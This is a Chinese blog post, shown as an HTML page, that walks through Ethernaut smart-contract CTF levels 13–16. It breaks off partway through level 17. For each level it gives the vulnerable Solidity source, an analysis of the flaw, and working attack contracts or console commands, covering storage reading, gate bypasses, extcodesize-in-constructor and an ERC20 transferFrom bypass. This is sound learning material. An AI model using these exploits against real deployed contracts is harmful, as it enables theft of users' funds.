@@ -1,0 +1,503 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="Ethernaut">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Ethernaut靶场学习实践（三）">
+<meta property="og:url" content="http://example.com/2022/12/01/Ethernaut%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E5%AE%9E%E8%B7%B5%EF%BC%88%E4%B8%89%EF%BC%89/index.html">
+<meta property="og:site_name" content="lucifer&#39;s blog">
+<meta property="og:description" content="Ethernaut">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/3915d472828e436d8e43ccb6d3053fb8.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/ae228a1918d14b74b90a495a497406d5.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/7c210a8425964054ac01c5fef4afb377.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/6121c4c29a8040abbd6ef28e404a7e31.png">
+<meta property="article:published_time" content="2022-12-01T06:30:29.000Z">
+<meta property="article:modified_time" content="2022-12-01T07:10:54.378Z">
+<meta property="article:author" content="lucifer">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/3915d472828e436d8e43ccb6d3053fb8.png">
+
+<link rel="canonical" href="http://example.com/2022/12/01/Ethernaut%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E5%AE%9E%E8%B7%B5%EF%BC%88%E4%B8%89%EF%BC%89/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Ethernaut靶场学习实践（三） | lucifer's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">lucifer's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>
+
+  </li>
+        <li class="menu-item menu-item-resources">
+
+    <a href="/resources/" rel="section"><i class="download fa-fw"></i>资源</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/01/Ethernaut%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E5%AE%9E%E8%B7%B5%EF%BC%88%E4%B8%89%EF%BC%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="lucifer">
+      <meta itemprop="description" content="我的老婆严菡是猪">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lucifer's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Ethernaut靶场学习实践（三）
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-12-01 14:30:29 / 修改时间：15:10:54" itemprop="dateCreated datePublished" datetime="2022-12-01T14:30:29+08:00">2022-12-01</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Ethernaut/" itemprop="url" rel="index"><span itemprop="name">Ethernaut</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>10k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>9 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>Ethernaut<br> <span id="more"></span><br>@<a href="%E9%A2%98%E7%9B%AE%E9%A2%84%E8%A7%88">TOC</a></p>
+<h1 id="13-Privacy"><a href="#13-Privacy" class="headerlink" title="13.Privacy"></a>13.Privacy</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>源码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Privacy</span> &#123;</span><br><span class="line"></span><br><span class="line">  bool public locked = <span class="literal">true</span>;</span><br><span class="line">  uint256 public <span class="variable constant_">ID</span> = block.<span class="property">timestamp</span>;</span><br><span class="line">  uint8 private flattening = <span class="number">10</span>;</span><br><span class="line">  uint8 private denomination = <span class="number">255</span>;</span><br><span class="line">  uint16 private awkwardness = <span class="title function_">uint16</span>(now);</span><br><span class="line">  bytes32[<span class="number">3</span>] private data;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">bytes32[<span class="number">3</span>] memory _data</span>) public &#123;</span><br><span class="line">    data = _data;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">unlock</span>(<span class="params">bytes16 _key</span>) public &#123;</span><br><span class="line">    <span class="built_in">require</span>(_key == <span class="title function_">bytes16</span>(data[<span class="number">2</span>]));</span><br><span class="line">    locked = <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    A bunch of super advanced solidity algorithms...</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      ,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`</span></span><br><span class="line"><span class="comment">      .,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,</span></span><br><span class="line"><span class="comment">      *.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^         ,---/V\</span></span><br><span class="line"><span class="comment">      `*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.    ~|__(o.o)</span></span><br><span class="line"><span class="comment">      ^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;  UU  UU</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>题目简单明了，需要我们调用unlock，而调用unlock的条件需要我们输进去的key与data[2]相同，很明显，与Vault一样，需要我们从solidity的存储机制入手。<br> unused(31)     locked(1) ⇐ slot(0)<br> ID(32) ⇐ slot(1)<br> unused(28) flattening(1) denomination(1) awkwardness(2) ⇐ slot(2)<br> data[0](3 2) ⇐ slot(3)<br> data[1](3 2) ⇐ slot(4)<br> data[2](3 2) ⇐ slot(5)<br> 从上面分析我们可以看到，data[2]存储在slot[5]</p>
+<h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>在控制台输入 await web3.eth.getStorageAt(contract.address,5),即可得到data[2]的值</p>
+<p>继续执行data[2].slice(0,34)，其中data[2]需换成你们自己上条指令得到的data[2]，slice(0,34)是为了去掉后面的十六个字节，因为我们传进去的值只需要十六个字节.</p>
+<p>最后执行 await contract.unlock(“第二条指令的值”)，即可提交实例，过关。</p>
+<h1 id="14-Gatekeeper-One"><a href="#14-Gatekeeper-One" class="headerlink" title="14.Gatekeeper One"></a>14.Gatekeeper One</h1><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>源码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">GatekeeperOne</span> &#123;</span><br><span class="line"></span><br><span class="line">  using <span class="title class_">SafeMath</span> <span class="keyword">for</span> uint256;</span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier <span class="title function_">gateOne</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.<span class="property">sender</span> != tx.<span class="property">origin</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier <span class="title function_">gateTwo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="built_in">require</span>(<span class="title function_">gasleft</span>().<span class="title function_">mod</span>(<span class="number">8191</span>) == <span class="number">0</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier <span class="title function_">gateThree</span>(<span class="params">bytes8 _gateKey</span>) &#123;</span><br><span class="line">      <span class="built_in">require</span>(<span class="title function_">uint32</span>(<span class="title function_">uint64</span>(_gateKey)) == <span class="title function_">uint16</span>(<span class="title function_">uint64</span>(_gateKey)), <span class="string">&quot;GatekeeperOne: invalid gateThree part one&quot;</span>);</span><br><span class="line">      <span class="built_in">require</span>(<span class="title function_">uint32</span>(<span class="title function_">uint64</span>(_gateKey)) != <span class="title function_">uint64</span>(_gateKey), <span class="string">&quot;GatekeeperOne: invalid gateThree part two&quot;</span>);</span><br><span class="line">      <span class="built_in">require</span>(<span class="title function_">uint32</span>(<span class="title function_">uint64</span>(_gateKey)) == <span class="title function_">uint16</span>(tx.<span class="property">origin</span>), <span class="string">&quot;GatekeeperOne: invalid gateThree part three&quot;</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">enter</span>(<span class="params">bytes8 _gateKey</span>) public gateOne gateTwo <span class="title function_">gateThree</span>(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant = tx.<span class="property">origin</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这关需要我们成为entrant，其实也就是让我们成功调用enter函数，成功通过三个修饰符，我们一个一个进行分析。<br>gateOne:很简单，只需要我们通过攻击合约调用合约<br>gateTwo:需要gas.left().mod(8191)==0，也就是我们执行到这一步所剩余的gas是8191的倍数，执行后才能进行完成。<br>gateThree:第一条件需要32位的gateKey等于16位的gateKey,也就是gateKey的第17-32位全为零。<br>第二条件需要32位的gateKey与64位的gateKey不想等，也就是33-64位不全为零。<br>第三条件需要gateKey的前十六位等于tx.origin。<br>我们一步一步来解决。</p>
+<h2 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h2><p>攻击合约：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line">    <span class="title class_">GatekeeperOne</span> gat;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address addr</span>)public&#123;</span><br><span class="line">        gat = <span class="title class_">GatekeeperOne</span>(addr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">complete</span>(<span class="params"></span>)public&#123;</span><br><span class="line">        bytes8 _addr = <span class="title function_">bytes8</span>(<span class="title function_">uint64</span>(msg.<span class="property">sender</span>) &amp; <span class="number">0xffffffff0000ffff</span>);</span><br><span class="line">        gat.<span class="title function_">enter</span>(_addr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先他要我们前十六位全为我们自己的地址，我们将自己的地址直接转换就可以了，第17-32位全为零，由于uint强转是从后面取，也就是十六进制的第9-12位全为零，而1-8位不全为零，因此我们构造出一个Bytes8的数据，并跟我们的数据进行与运算，即可满足要求。</p>
+<p>随后调用，然后一步步找到剩余的gas，我们需要找到区块链浏览器中的第二个gas操作，并取该gas-2的值，因为gasleft本身也会消耗gas，再与8191进行mod运算，在初始gas处减少响应的结果，重复2-3次，即可成功，提交实例，攻击完成</p>
+<h1 id="15-Gatekeeper-Two"><a href="#15-Gatekeeper-Two" class="headerlink" title="15.Gatekeeper Two"></a>15.Gatekeeper Two</h1><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>源码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">GatekeeperTwo</span> &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier <span class="title function_">gateOne</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.<span class="property">sender</span> != tx.<span class="property">origin</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier <span class="title function_">gateTwo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    uint x;</span><br><span class="line">    assembly &#123; x := <span class="title function_">extcodesize</span>(<span class="title function_">caller</span>()) &#125;</span><br><span class="line">    <span class="built_in">require</span>(x == <span class="number">0</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier <span class="title function_">gateThree</span>(<span class="params">bytes8 _gateKey</span>) &#123;</span><br><span class="line">    <span class="built_in">require</span>(<span class="title function_">uint64</span>(<span class="title function_">bytes8</span>(<span class="title function_">keccak256</span>(abi.<span class="title function_">encodePacked</span>(msg.<span class="property">sender</span>)))) ^ <span class="title function_">uint64</span>(_gateKey) == <span class="title function_">uint64</span>(<span class="number">0</span>) - <span class="number">1</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">enter</span>(<span class="params">bytes8 _gateKey</span>) public gateOne gateTwo <span class="title function_">gateThree</span>(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant = tx.<span class="property">origin</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这关与上关的要求一样，知识修饰符内容不一样，我们还是来一个一个的分析。<br>gateOne:与上题一样，需要攻击合约<br>gateTwo:assembly是用于写汇编语言的，感兴趣的可以自己去搜索，extcodesize(caller()）的意思是调用者的地址为零，什么时候合约地址为零呢，合约尚未构造完成时，所以我们需要在构造函数中进行攻击。<br>gateThree:我们传进去的值需要与我们的合约地址进行异或算法且为2^64-1。<br>我们一个一个进行解决</p>
+<h2 id="攻击-2"><a href="#攻击-2" class="headerlink" title="攻击"></a>攻击</h2><p>攻击合约：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line">    <span class="title class_">GatekeeperTwo</span> gat;</span><br><span class="line">    <span class="comment">//为满足合约地址为零，在构造函数中进行攻击</span></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address addr</span>)public&#123;</span><br><span class="line">        gat = <span class="title class_">GatekeeperTwo</span>(addr);</span><br><span class="line">        bytes8 _gateKey = <span class="title function_">bytes8</span>(<span class="title function_">uint64</span>(<span class="title function_">bytes8</span>(<span class="title function_">keccak256</span>(abi.<span class="title function_">encodePacked</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>))))) ^ <span class="title function_">uint64</span>(<span class="number">0</span>)-<span class="number">1</span>);</span><br><span class="line">        gat.<span class="title function_">enter</span>(_gateKey);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>前两个条件都满足了，我们重点放在第三个条件，我们都知道，一个数与同一个数进行异或会得到全0，所以我们构造出的_gateKey只需要是我们地址与2^64-1进行异或即可。<br>部署攻击合约，提交实例，关卡完成。</p>
+<h1 id="16-Naught-Coin"><a href="#16-Naught-Coin" class="headerlink" title="16.Naught Coin"></a>16.Naught Coin</h1><h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><p>源码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;@openzeppelin/contracts/token/ERC20/ERC20.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line"> contract <span class="title class_">NaughtCoin</span> is <span class="title class_">ERC20</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// string public constant name = &#x27;NaughtCoin&#x27;;</span></span><br><span class="line">  <span class="comment">// string public constant symbol = &#x27;0x0&#x27;;</span></span><br><span class="line">  <span class="comment">// uint public constant decimals = 18;</span></span><br><span class="line">  uint public timeLock = now + <span class="number">10</span> * <span class="number">365</span> days;</span><br><span class="line">  uint256 public <span class="variable constant_">INITIAL_SUPPLY</span>;</span><br><span class="line">  address public player;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">address _player</span>) </span><br><span class="line">  <span class="title class_">ERC20</span>(<span class="string">&#x27;NaughtCoin&#x27;</span>, <span class="string">&#x27;0x0&#x27;</span>)</span><br><span class="line">  public &#123;</span><br><span class="line">    player = _player;</span><br><span class="line">    <span class="variable constant_">INITIAL_SUPPLY</span> = <span class="number">1000000</span> * (<span class="number">10</span>**<span class="title function_">uint256</span>(<span class="title function_">decimals</span>()));</span><br><span class="line">    <span class="comment">// _totalSupply = INITIAL_SUPPLY;</span></span><br><span class="line">    <span class="comment">// _balances[player] = INITIAL_SUPPLY;</span></span><br><span class="line">    <span class="title function_">_mint</span>(player, <span class="variable constant_">INITIAL_SUPPLY</span>);</span><br><span class="line">    emit <span class="title class_">Transfer</span>(<span class="title function_">address</span>(<span class="number">0</span>), player, <span class="variable constant_">INITIAL_SUPPLY</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">transfer</span>(<span class="params">address _to, uint256 _value</span>) override public lockTokens <span class="title function_">returns</span>(<span class="params">bool</span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>.<span class="title function_">transfer</span>(_to, _value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Prevent the initial owner from transferring tokens until the timelock has passed</span></span><br><span class="line">  modifier <span class="title function_">lockTokens</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (msg.<span class="property">sender</span> == player) &#123;</span><br><span class="line">      <span class="built_in">require</span>(now &gt; timeLock);</span><br><span class="line">      _;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     _;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+<p>本题合约是一个ERC20代币合约，且我们地址本身含有很多余额，但时间未到，无法使用。需要我们想办法将我们的余额取出来，我们可以看到他对transfer函数进行了限制，必须要时间到了之后才允许我们将余额取出来，但他是ERC20合约，他却并没有对transferFrom函数进行限制，因此，我们可以在这上面做文章。</p>
+<h2 id="攻击-3"><a href="#攻击-3" class="headerlink" title="攻击"></a>攻击</h2><p>我们要调用transferFrom函数就需要先给调用者我们余额的使用权限，在控制台输入await contract.approve(contract.address,await contract.balanceof(player)) ,然后再输入<br>await contract.transferFrom(player,contract.address,await contract.balanceOf(player)),即可完成攻击，提交实例。</p>
+<h1 id="17-Preservation"><a href="#17-Preservation" class="headerlink" title="17.Preservation"></a>17.Preservation</h1><h2 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h2><p>源码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Preservation</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// public library contracts </span></span><br><span class="line">  address public timeZone1Library;</span><br><span class="line">  address public timeZone2Library;</span><br><span class="line">  address public owner; </span><br><span class="line">  uint storedTime;</span><br><span class="line">  <span class="comment">// Sets the function signature for delegatecall</span></span><br><span class="line">  bytes4 constant setTimeSignature = <span class="title function_">bytes4</span>(<span class="title function_">keccak256</span>(<span class="string">&quot;setTime(uint256)&quot;</span>));</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">address _timeZone1LibraryAddress, address 